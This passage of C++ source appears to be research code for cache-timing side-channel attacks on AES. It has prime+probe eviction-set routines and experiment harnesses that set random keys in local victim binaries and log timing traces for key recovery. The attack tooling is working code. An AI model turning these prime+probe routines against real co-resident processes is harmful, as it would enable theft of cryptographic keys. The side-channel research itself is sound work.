			rand_key[i] = rand()%256;
		}

		char key_text[64] = {0};
		char* key_str = aesToString(rand_key, sizeof(rand_key));
		strcat(key_text, key_str);
		free(key_str);
		strcat(key_text, ",");

		set_victim_key(setup_res.adata, rand_key, sizeof(rand_key));

		perform_attack_random_ct_round_sbox_key(setup_res.adata, test_count, fout, 0, 0, rand_key, key_text);
		perform_attack_random_ct_round_sbox_key(setup_res.adata, test_count, fout, 1, 0, rand_key, key_text);
		perform_attack_random_ct_round_sbox_key(setup_res.adata, test_count, fout, 2, 0, rand_key, key_text);
		perform_attack_random_ct_round_sbox_key_ge(setup_res.adata, test_count, fout, 2, 0, rand_key, key_text);
	}

	fclose(fout);

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);

	return 0;
}

static int test_aes_sbox_rounds_interleave(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_sbox_victim";
	int start_phase = 8;
	int test_count = 1000;
	int target_line = 17;
	const char* out_file = "attack_sbox.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);
		
	FILE* fout = fopen(out_file, "w");
	
	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	setup_res.adata->start_phase = start_phase;
	
	uint8_t rand_key[16];

	for(int k = 0; k < 80; k++) {
		printf("Keys: %d%%\n", k);

		for(int i = 0; i < 16; i++) {
			rand_key[i] = rand()%256;
		}

		char key_text[64] = {0};
		char* key_str = aesToString(rand_key, sizeof(rand_key));
		strcat(key_text, key_str);
		free(key_str);
		strcat(key_text, ",");

		set_victim_key(setup_res.adata, rand_key, sizeof(rand_key));

		AES_KEY aeskey;
		AES_set_decrypt_key_sbox(rand_key, 128, &aeskey);
		perform_attack_multiple_ct(setup_res.adata, test_count*3, [&aeskey](int t, uint8_t* input) {
			switch(t%3) {
				case 0: return generate_example_ct_sbox(&aeskey, input, 0, 0);
				case 1: return generate_example_ct_sbox(&aeskey, input, 1, 0);
				// case 2: return generate_example_ct_sbox(&aeskey, input, 2, 0);
				case 2: return generate_example_ct_sbox_ge(&aeskey, input, 2, 0);
			}
		}, fout, key_text);
	}

	fclose(fout);

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);

	return 0;
}

// static uint64_t probe_evset(ev::EvictionSet& set) {
// 	measure::Measure<measure::t_RDTSC> rdtsc_measure;

// 	uint64_t trash = blackbox(0);
// 	uint64_t t = rdtsc_measure.measure([&](uint64_t &trash_) {
// 		for(int i = 0; i < LLC_CACHE_ASSOCIATIVITY; i++) {
// 			create_fake_dependency(READ(set.arr[i]));
// 		}
// 	}, trash);
// 	return t;
// }
// static void prime_evset(ev::EvictionSet& set) {
// 	for(int i = 0; i < 5; i++)
// 		probe_evset(set);
// }

static __attribute_noinline__ uint64_t probe_evset(ev::EvictionSet& set) {
	uintptr_t p = set.arr[0];

	uint64_t s = measure::rdtscp_strong();
	do {
		p = *(uintptr_t*)(p);
		create_fake_dependency(p);
	} while(p != set.arr[0]);
	return measure::rdtscp_strong() - s;
}
static void prime_evset(ev::EvictionSet& set) {
	for(int i = 0; i < 5; i++)
		probe_evset(set);
}

// static void prime_evset(ev::EvictionSet& set) {
// 	create_fake_dependency(optimal_prime_pat.access(set, blackbox(0)));
// }
// static uint64_t probe_evset(ev::EvictionSet& set) {
// 	measure::Measure<measure::t_RDTSC> rdtsc_measure;

// 	uint64_t trash = blackbox(0);
// 	uint64_t t = rdtsc_measure.measure(set.arr[0], trash);
// 	create_fake_dependency(trash);

// 	return t;
// }

static void perform_pp_attack(volatile AESAttackData* adata, size_t count, ev::EvictionSet sets[64],
	FILE* out, const char* prefix) {
	auto ciphertexts = new uint8_t[count][16];
	auto attacker = new uint64_t[count][64];

	uint8_t input[16];
	for(size_t t = 0; t < count; t++) {
		memory_fences();

		for(int i = 0; i < 16; i++) {
			input[i] = rand() % 256;
		}

		for(int i = 0; i < 16; i++) {
			adata->next_ciphertext[i] = input[i];
			ciphertexts[t][i] = input[i];
		}

		memory_fences();

		adata->victim_status = ProcessStatus::CopyCiphertext;

		memory_fences();

		// Wait for victim to be ready
		WAIT_VICTIM(adata, ProcessStatus::Ready);

		memory_fences();

		// PRIME
		for(int i = 0; i < 64; i++) {
			prime_evset(sets[i]);
		}

		memory_fences();

		// Start the decryption
		adata->start_signal = true;

		memory_fences();

		// Wait for victim to finish
		WAIT_VICTIM(adata, ProcessStatus::Finished);

		memory_fences();

		// PROBE
		for(int i = 0; i < 64; i++) {
			attacker[t][i] = probe_evset(sets[i]);
		}

		memory_fences();

		// Reset signal
		adata->start_signal = false;

		memory_fences();

		// Reset status
		adata->victim_status = ProcessStatus::Prep;

		memory_fences();
	}

	for(int t = 0; t < count; t++) {
		fprintf(out, "%s", prefix);
		for(int i = 0; i < 16; i++) {
			fprintf(out, "%02x", ciphertexts[t][i]);
		}
		for(int i = 0; i < 64; i++) {
			fprintf(out, ",%zu", attacker[t][i]);
		}
		fprintf(out, "\n");
	}

	delete[] ciphertexts;
	delete[] attacker;
}

static int test_aes_break_prime_probe(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_ttable_victim";
	int start_phase = 8;
	int test_count = 10000;
	int target_line = 16;
	const char* out_file = "attack_pp.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	FILE* fout = fopen(out_file, "w");
	
	auto setup_res = setup_prime_probe_attack(victim_binary);
	setup_res.adata->start_phase = start_phase;
	setup_res.adata->aes_256 = true;
	
	uint8_t rand_key[32];

	for(int k = 0; k < 1'0; k++) {
		if(k % 10 == 0)
			printf("Keys: %d%%\n", k / 10);

		for(int i = 0; i < 32; i++) {
			rand_key[i] = rand()%256;
		}

		char key_text[128] = {0};
		char* key_str = aesToString(rand_key, sizeof(rand_key));
		strcat(key_text, key_str);
		free(key_str);
		strcat(key_text, ",");

		set_victim_key(setup_res.adata, rand_key, sizeof(rand_key));

		perform_pp_attack(setup_res.adata, test_count, setup_res.sets, fout, key_text);
	}

	cleanup_child(setup_res.victim);

	fclose(fout);
	return 0;
}

static int test_min_distinguish(int argc, char *argv[]) {
	const char* victim_binary = "./build/min_distinguish_victim";
	int start_phase = 10;
	int test_count = 1000;
	int target_line = 37;
	const char* out_file = "";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);
	
	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	auto adata = setup_res.adata;
	adata->start_phase = start_phase;
	
	constexpr size_t D_MAX = 120;
	auto attacker1 = new int[test_count][D_MAX];
	auto attacker2 = new int[test_count][D_MAX];
	for(int t = 0; t < test_count; t++) {
		for(int d = 0; d < D_MAX; d++) {
			memory_fences();

			adata->parameter = d;

			memory_fences();

			adata->victim_status = ProcessStatus::CopyCiphertext; // No ciphertext, just a signal we set `d`

			memory_fences();

			auto res = perform_single_attack(adata);
			attacker1[t][d] = res.attacker1;
			attacker2[t][d] = res.attacker2;

			memory_fences();
		}
	}
	for(int t = 0; t < test_count; t++) {
		for(int d = 0; d < D_MAX; d++) {
			printf("%d ", attacker1[t][d]);
		}
		for(int d = 0; d < D_MAX; d++) {
			printf("%d ", attacker2[t][d]);
		}
		printf("\n");
	}

	delete[] attacker1;
	delete[] attacker2;

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);

	return 0;
}

int test_aes_break2(int argc, char *argv[]) {
	// return test_aes_break_graph(argc, argv);
	// return test_aes_break_random_ct(argc, argv);
	// return test_aes_break_random_key(argc, argv);
	// return test_aes_break_random_ct_round2(argc, argv);
	// return test_aes_break_graph_sbox(argc, argv);
	// return test_aes_break_random_ct_sbox(argc, argv);
	// return test_aes_break_prime_probe(argc, argv);
	// return test_min_distinguish(argc, argv);

	//setvbuf(stdout, NULL, _IOLBF, 0);

	if(argc < 3) {
		fprintf(stderr, "Please provide experiment name\n");
		return 1;
	}

	srand(time(NULL));

	char* expr_name = argv[2];
	if(strcmp(expr_name, "min_distinguish") == 0)
		return test_min_distinguish(argc, argv);
	if(strcmp(expr_name, "sbox_msb") == 0)
		return test_aes_break_random_key_sbox(argc, argv);
	if(strcmp(expr_name, "sbox_sr_adaptive") == 0)
		return test_aes_break_random_key_sbox_sr_adaptive(argc, argv);
	if(strcmp(expr_name, "sbox_round") == 0)
		return test_aes_sbox_rounds(argc, argv);
	if(strcmp(expr_name, "sbox_round_inter") == 0)
		return test_aes_sbox_rounds_interleave(argc, argv);

	fprintf(stderr, "No such experiment\n");
	return 1;
}
